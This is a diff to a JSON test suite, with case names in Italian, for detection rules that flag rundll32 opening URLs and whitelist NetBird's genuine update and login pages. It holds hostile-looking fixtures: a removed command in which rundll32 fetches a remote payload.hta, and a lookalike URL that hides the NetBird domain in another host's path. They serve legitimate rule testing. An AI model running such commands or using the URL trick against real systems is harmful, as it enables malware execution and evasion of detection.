@@ -2,34 +2,63 @@
   "rules": "rules/windows_rundll32_rules.xml",
   "cases": [
     {
-      "name": "NetBird apre la pagina di login",
+      "name": "NetBird apre la pagina di aggiornamento",
+      "event": "examples/netbird_rundll32_update_event.json",
+      "expect": {
+        "100974": true,
+        "100979": true
+      }
+    },
+    {
+      "name": "NetBird apre la pagina di login (resta un alert)",
       "event": "examples/netbird_rundll32_url_event.json",
-      "expect": { "100974": true, "100979": true }
+      "expect": {
+        "100974": true,
+        "100979": false
+      }
     },
     {
       "name": "netbird-ui.exe finto in una cartella scrivibile dall'utente",
-      "event": "examples/netbird_rundll32_url_event.json",
+      "event": "examples/netbird_rundll32_update_event.json",
       "override": {
         "win.eventdata.parentProcessName": "C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\Netbird\\\\netbird-ui.exe"
       },
-      "expect": { "100974": true, "100979": false }
+      "expect": {
+        "100974": true,
+        "100979": false
+      }
     },
     {
-      "name": "rundll32 lanciato da un altro processo",
-      "event": "examples/netbird_rundll32_url_event.json",
+      "name": "stesso comando lanciato da un altro processo",
+      "event": "examples/netbird_rundll32_update_event.json",
       "override": {
-        "win.eventdata.parentProcessName": "C:\\\\Windows\\\\explorer.exe",
-        "win.eventdata.commandLine": "rundll32.exe url.dll,FileProtocolHandler http://198.51.100.7/payload.hta"
+        "win.eventdata.parentProcessName": "C:\\\\Windows\\\\explorer.exe"
       },
-      "expect": { "100974": true, "100979": false }
+      "expect": {
+        "100974": true,
+        "100979": false
+      }
+    },
+    {
+      "name": "dominio NetBird solo nel percorso di un altro sito",
+      "event": "examples/netbird_rundll32_update_event.json",
+      "override": {
+        "win.eventdata.commandLine": "rundll32 url.dll,FileProtocolHandler https://198.51.100.7/https://pkgs.netbird.io/windows/x64"
+      },
+      "expect": {
+        "100974": true,
+        "100979": false
+      }
     },
     {
       "name": "rundll32 senza URL",
-      "event": "examples/netbird_rundll32_url_event.json",
+      "event": "examples/netbird_rundll32_update_event.json",
       "override": {
         "win.eventdata.commandLine": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"
       },
-      "expect": { "100974": false }
+      "expect": {
+        "100974": false
+      }
     }
   ]
 }
